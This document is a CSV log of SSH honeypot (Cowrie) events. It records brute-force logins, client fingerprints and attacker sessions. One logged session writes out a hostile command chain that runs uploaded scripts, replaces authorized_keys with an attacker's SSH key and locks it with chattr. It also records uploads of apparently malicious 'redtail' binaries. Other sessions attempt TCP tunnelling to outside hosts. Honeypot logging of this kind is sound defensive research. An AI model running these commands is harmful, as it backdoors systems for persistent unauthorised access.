eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.version,45.79.181.104,,,,61f3998c3976,," \xee  \xea\x83&\xcb\xc8W7\xa9	\x8fn\xfb\xec\xa0\x99\xa8\xbdE\xcc\xe8\xe8H\xc3YH\xaf\xc6 \xfc\xdcu\xb3\x8eJ\xd0\xda'\xb2\xa7'\xb4# -?v\xf9\xe7\xe2\xa7\xd9cC>:s &\xc0+\xc0/\xc0,\xc00̨̩\xc0	\xc0\xc0",,,"Remote SSH version:  \xee  \xea\x83&\xcb\xc8W7\xa9	\x8fn\xfb\xec\xa0\x99\xa8\xbdE\xcc\xe8\xe8H\xc3YH\xaf\xc6 \xfc\xdcu\xb3\x8eJ\xd0\xda'\xb2\xa7'\xb4# -?v\xf9\xe7\xe2\xa7\xd9cC>:s &\xc0+\xc0/\xc0,\xc00̨̩\xc0	\xc0\xc0",localhost,2024-11-06T01:07:36.122379Z
cowrie.session.closed,45.79.181.104,,,,61f3998c3976,,,,,Connection lost after 0 seconds,localhost,2024-11-06T01:07:36.122970Z
cowrie.session.connect,45.148.10.117,50552,172.233.154.19,2222,a82c64423ec1,ssh,,,,New connection: 45.148.10.117:50552 (172.233.154.19:2222) [session: a82c64423ec1],localhost,2024-11-06T01:08:18.816718Z
cowrie.client.version,45.148.10.117,,,,a82c64423ec1,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:08:18.817294Z
cowrie.client.kex,45.148.10.117,,,,a82c64423ec1,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:08:18.956918Z
cowrie.login.failed,45.148.10.117,,,,a82c64423ec1,,,,,login attempt [node/12345678] failed,localhost,2024-11-06T01:08:19.381418Z
cowrie.session.closed,45.148.10.117,,,,a82c64423ec1,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:08:20.523111Z
cowrie.session.connect,134.175.52.143,42116,172.233.154.19,2222,885862f19bda,ssh,,,,New connection: 134.175.52.143:42116 (172.233.154.19:2222) [session: 885862f19bda],localhost,2024-11-06T01:11:03.816350Z
cowrie.client.version,134.175.52.143,,,,885862f19bda,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-06T01:11:03.829146Z
cowrie.client.kex,134.175.52.143,,,,885862f19bda,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-06T01:11:04.035889Z
cowrie.login.success,134.175.52.143,,,,885862f19bda,,,,,login attempt [root/qq5211314] succeeded,localhost,2024-11-06T01:11:04.796257Z
cowrie.session.closed,134.175.52.143,,,,885862f19bda,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:11:05.024535Z
cowrie.session.connect,87.120.113.231,33638,172.233.154.19,2222,32347fa3fc57,ssh,,,,New connection: 87.120.113.231:33638 (172.233.154.19:2222) [session: 32347fa3fc57],localhost,2024-11-06T01:11:05.328887Z
cowrie.client.version,87.120.113.231,,,,32347fa3fc57,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:11:05.329394Z
cowrie.client.kex,87.120.113.231,,,,32347fa3fc57,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-06T01:11:05.467280Z
cowrie.login.success,87.120.113.231,,,,32347fa3fc57,,,,,login attempt [root/qq5211314] succeeded,localhost,2024-11-06T01:11:05.883071Z
cowrie.session.params,87.120.113.231,,,,32347fa3fc57,,,,,[],localhost,2024-11-06T01:11:37.428023Z
cowrie.command.input,87.120.113.231,,,,32347fa3fc57,,,,,"CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",localhost,2024-11-06T01:11:37.428447Z
cowrie.session.file_download,87.120.113.231,,,,32347fa3fc57,,,,,Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b,localhost,2024-11-06T01:11:37.568487Z
cowrie.log.closed,87.120.113.231,,,,32347fa3fc57,,,,,Closing TTY Log: var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6 after 0 seconds,localhost,2024-11-06T01:11:37.569011Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""clean.sh"" to var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",localhost,2024-11-06T01:11:37.569754Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""redtail.arm7"" to var/lib/cowrie/downloads/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4",localhost,2024-11-06T01:11:37.571643Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""redtail.arm8"" to var/lib/cowrie/downloads/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472",localhost,2024-11-06T01:11:37.573840Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""redtail.i686"" to var/lib/cowrie/downloads/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586",localhost,2024-11-06T01:11:37.576130Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""redtail.x86_64"" to var/lib/cowrie/downloads/29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b",localhost,2024-11-06T01:11:37.578521Z
cowrie.session.file_upload,87.120.113.231,,,,32347fa3fc57,,,,,"SFTP Uploaded file ""setup.sh"" to var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae",localhost,2024-11-06T01:11:37.579349Z
cowrie.session.closed,87.120.113.231,,,,32347fa3fc57,,,,,Connection lost after 32 seconds,localhost,2024-11-06T01:11:37.579753Z
cowrie.session.connect,45.148.10.117,48786,172.233.154.19,2222,71573abbf122,ssh,,,,New connection: 45.148.10.117:48786 (172.233.154.19:2222) [session: 71573abbf122],localhost,2024-11-06T01:14:11.258595Z
cowrie.client.version,45.148.10.117,,,,71573abbf122,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:14:11.259212Z
cowrie.client.kex,45.148.10.117,,,,71573abbf122,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:14:11.400733Z
cowrie.login.failed,45.148.10.117,,,,71573abbf122,,,,,login attempt [nodeoperator/nodeoperator] failed,localhost,2024-11-06T01:14:11.827188Z
cowrie.session.closed,45.148.10.117,,,,71573abbf122,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:14:12.970753Z
cowrie.session.connect,45.148.10.14,64148,172.233.154.19,2222,a5df5ba128e1,ssh,,,,New connection: 45.148.10.14:64148 (172.233.154.19:2222) [session: a5df5ba128e1],localhost,2024-11-06T01:15:01.790220Z
cowrie.client.version,45.148.10.14,,,,a5df5ba128e1,," ^     $  *  +  ,  0  1 $ U \xff\xbc      \xd0 p\xf4&\x8e   8y\xc1.\xf7            ",,,"Remote SSH version:  ^     $  *  +  ,  0  1 $ U \xff\xbc      \xd0 p\xf4&\x8e   8y\xc1.\xf7            ",localhost,2024-11-06T01:15:01.850247Z
cowrie.session.closed,45.148.10.14,,,,a5df5ba128e1,,,,,Connection lost after 0 seconds,localhost,2024-11-06T01:15:01.851097Z
cowrie.session.connect,45.148.10.117,54916,172.233.154.19,2222,4db949b02ba8,ssh,,,,New connection: 45.148.10.117:54916 (172.233.154.19:2222) [session: 4db949b02ba8],localhost,2024-11-06T01:20:02.859417Z
cowrie.client.version,45.148.10.117,,,,4db949b02ba8,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:20:02.860039Z
cowrie.client.kex,45.148.10.117,,,,4db949b02ba8,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:20:02.996969Z
cowrie.login.failed,45.148.10.117,,,,4db949b02ba8,,,,,login attempt [daoperator/daoperator] failed,localhost,2024-11-06T01:20:03.410648Z
cowrie.session.closed,45.148.10.117,,,,4db949b02ba8,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:20:04.549583Z
cowrie.session.connect,45.148.10.117,47726,172.233.154.19,2222,f9dabe04c226,ssh,,,,New connection: 45.148.10.117:47726 (172.233.154.19:2222) [session: f9dabe04c226],localhost,2024-11-06T01:25:55.543248Z
cowrie.client.version,45.148.10.117,,,,f9dabe04c226,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:25:55.543810Z
cowrie.client.kex,45.148.10.117,,,,f9dabe04c226,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:25:55.684363Z
cowrie.login.failed,45.148.10.117,,,,f9dabe04c226,,,,,login attempt [aleo/aleo] failed,localhost,2024-11-06T01:25:56.107628Z
cowrie.session.closed,45.148.10.117,,,,f9dabe04c226,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:25:57.249968Z
cowrie.session.connect,45.148.10.117,52386,172.233.154.19,2222,d0f4ce8bf571,ssh,,,,New connection: 45.148.10.117:52386 (172.233.154.19:2222) [session: d0f4ce8bf571],localhost,2024-11-06T01:31:47.880260Z
cowrie.client.version,45.148.10.117,,,,d0f4ce8bf571,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:31:47.880975Z
cowrie.client.kex,45.148.10.117,,,,d0f4ce8bf571,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:31:48.019837Z
cowrie.login.failed,45.148.10.117,,,,d0f4ce8bf571,,,,,login attempt [hubble/hubble] failed,localhost,2024-11-06T01:31:48.446442Z
cowrie.session.closed,45.148.10.117,,,,d0f4ce8bf571,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:31:49.587276Z
cowrie.session.connect,45.148.10.117,59904,172.233.154.19,2222,fac21e37a3f7,ssh,,,,New connection: 45.148.10.117:59904 (172.233.154.19:2222) [session: fac21e37a3f7],localhost,2024-11-06T01:37:40.457919Z
cowrie.client.version,45.148.10.117,,,,fac21e37a3f7,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:37:40.458561Z
cowrie.client.kex,45.148.10.117,,,,fac21e37a3f7,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:37:40.602588Z
cowrie.login.failed,45.148.10.117,,,,fac21e37a3f7,,,,,login attempt [namada/namada] failed,localhost,2024-11-06T01:37:41.035558Z
cowrie.session.closed,45.148.10.117,,,,fac21e37a3f7,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:37:42.181372Z
cowrie.session.connect,222.118.223.15,49069,172.233.154.19,2222,f5051c4d59a6,ssh,,,,New connection: 222.118.223.15:49069 (172.233.154.19:2222) [session: f5051c4d59a6],localhost,2024-11-06T01:42:56.301168Z
cowrie.session.closed,222.118.223.15,,,,f5051c4d59a6,,,,,Connection lost after 2 seconds,localhost,2024-11-06T01:42:59.245298Z
cowrie.session.connect,45.148.10.117,42956,172.233.154.19,2222,58d18d1e3d21,ssh,,,,New connection: 45.148.10.117:42956 (172.233.154.19:2222) [session: 58d18d1e3d21],localhost,2024-11-06T01:43:32.484357Z
cowrie.client.version,45.148.10.117,,,,58d18d1e3d21,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:43:32.484944Z
cowrie.client.kex,45.148.10.117,,,,58d18d1e3d21,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:43:32.624250Z
cowrie.login.failed,45.148.10.117,,,,58d18d1e3d21,,,,,login attempt [pion/pion] failed,localhost,2024-11-06T01:43:33.043216Z
cowrie.session.closed,45.148.10.117,,,,58d18d1e3d21,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:43:34.184396Z
cowrie.session.connect,92.255.85.107,21720,172.233.154.19,2222,5acc7b632a43,ssh,,,,New connection: 92.255.85.107:21720 (172.233.154.19:2222) [session: 5acc7b632a43],localhost,2024-11-06T01:44:27.673855Z
cowrie.client.version,92.255.85.107,,,,5acc7b632a43,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:44:27.674553Z
cowrie.client.kex,92.255.85.107,,,,5acc7b632a43,,,c3a948709cdbcfce6ee341735b6d74a2,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: c3a948709cdbcfce6ee341735b6d74a2,localhost,2024-11-06T01:44:27.904518Z
cowrie.login.success,92.255.85.107,,,,5acc7b632a43,,,,,login attempt [root/broadguam1] succeeded,localhost,2024-11-06T01:44:29.907306Z
cowrie.direct-tcpip.request,92.255.85.107,0,178.20.45.148,80,5acc7b632a43,,,,,direct-tcp connection request to 178.20.45.148:80 from 0.0.0.0:0,localhost,2024-11-06T01:44:30.545807Z
cowrie.session.closed,92.255.85.107,,,,5acc7b632a43,,,,,Connection lost after 29 seconds,localhost,2024-11-06T01:44:57.663097Z
cowrie.session.connect,95.214.53.211,60286,172.233.154.19,2222,5b25572c3b92,ssh,,,,New connection: 95.214.53.211:60286 (172.233.154.19:2222) [session: 5b25572c3b92],localhost,2024-11-06T01:47:20.480608Z
cowrie.client.version,95.214.53.211,,,,5b25572c3b92,,GET / HTTP/1.1,,,Remote SSH version: GET / HTTP/1.1,localhost,2024-11-06T01:47:20.481355Z
cowrie.session.closed,95.214.53.211,,,,5b25572c3b92,,,,,Connection lost after 0 seconds,localhost,2024-11-06T01:47:20.482083Z
cowrie.session.connect,45.148.10.117,41114,172.233.154.19,2222,cba3688fa6c3,ssh,,,,New connection: 45.148.10.117:41114 (172.233.154.19:2222) [session: cba3688fa6c3],localhost,2024-11-06T01:49:25.397489Z
cowrie.client.version,45.148.10.117,,,,cba3688fa6c3,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:49:25.398399Z
cowrie.client.kex,45.148.10.117,,,,cba3688fa6c3,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:49:25.538106Z
cowrie.login.failed,45.148.10.117,,,,cba3688fa6c3,,,,,login attempt [story/story] failed,localhost,2024-11-06T01:49:25.960614Z
cowrie.session.closed,45.148.10.117,,,,cba3688fa6c3,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:49:27.102662Z
cowrie.session.connect,45.148.10.117,44848,172.233.154.19,2222,300732dfa8da,ssh,,,,New connection: 45.148.10.117:44848 (172.233.154.19:2222) [session: 300732dfa8da],localhost,2024-11-06T01:55:18.341446Z
cowrie.client.version,45.148.10.117,,,,300732dfa8da,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-06T01:55:18.342174Z
cowrie.client.kex,45.148.10.117,,,,300732dfa8da,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-11-06T01:55:18.481986Z
cowrie.login.failed,45.148.10.117,,,,300732dfa8da,,,,,login attempt [vpn/vpn] failed,localhost,2024-11-06T01:55:18.908837Z
cowrie.session.closed,45.148.10.117,,,,300732dfa8da,,,,,Connection lost after 1 seconds,localhost,2024-11-06T01:55:20.050808Z
cowrie.session.connect,194.169.175.37,34956,172.233.154.19,2222,00701452bfbc,ssh,,,,New connection: 194.169.175.37:34956 (172.233.154.19:2222) [session: 00701452bfbc],localhost,2024-11-06T01:57:26.521648Z
cowrie.client.version,194.169.175.37,,,,00701452bfbc,,SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3,,,Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3,localhost,2024-11-06T01:57:26.522371Z
cowrie.client.kex,194.169.175.37,,,,00701452bfbc,,,390ffe68a68c2a2891210413e80689fa,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group1-sha1,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,aes128-cbc;umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none,zlib@openssh.com,zlib",SSH client hassh fingerprint: 390ffe68a68c2a2891210413e80689fa,localhost,2024-11-06T01:57:26.808537Z
cowrie.login.success,194.169.175.37,,,,00701452bfbc,,,,,login attempt [root/admin] succeeded,localhost,2024-11-06T01:57:29.723306Z
cowrie.direct-tcpip.request,194.169.175.37,45856,23.74.172.219,443,00701452bfbc,,,,,direct-tcp connection request to 23.74.172.219:443 from 127.0.0.1:45856,localhost,2024-11-06T01:57:30.732334Z
cowrie.direct-tcpip.data,194.169.175.37,,23.74.172.219,443,00701452bfbc,,,,,"discarded direct-tcp forward request 0 to 23.74.172.219:443 with data b""\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03\xbdS\\\xb9o%:\xcc\x82\xf2\xd0\x82\x8cq\x80\x0b\xd4\xf9\x028M\xe4\x8a\xbeE\xa96`p\x1e?\xad oF\x14\xde\xe3Uyu\xbe\xb0H\xcf\x8b\xdeO\x1f\x90O\xaa\xd5,P\x03\x1fE\x16\nr\xbf\x86=\x0c\x00V\x13\x02\x13\x03\x13\x01\xc0,\xc00\xc0+\xc0/\xcc\xa9\xcc\xa8\x00\x9f\x00\x9e\xcc\xaa\xc0\xaf\xc0\xad\xc0\xae\xc0\xac\xc0$\xc0(\xc0#\xc0'\xc0\n\xc0\x14\xc0\t\xc0\x13\xc0\xa3\xc0\x9f\xc0\xa2\xc0\x9e\x00k\x00g\x009\x003\x00\x9d\x00\x9c\xc0\xa1\xc0\x9d\xc0\xa0\xc0\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x01]\x00\x00\x00\x12\x00\x10\x00\x00\rwww.apple.com\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00\x10\x00\x0b\x00\t\x08http/1.1\x00\x16\x00\x00\x00\x17\x00\x00\x001\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02\x00+\x00\x05\x04\x03\x04\x03\x03\x00-\x00\x02\x01\x01\x003\x00&\x00$\x00\x1d\x00 h8\x8b\xa7P(\x16\x8d\xe6\xf8\xd7\xb7M\xafSj\x96\x0e\x8f\xd86\xbddxu\xfbM\xf7\x07X$\t\x00\x15\x00\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""",localhost,2024-11-06T01:57:31.023262Z
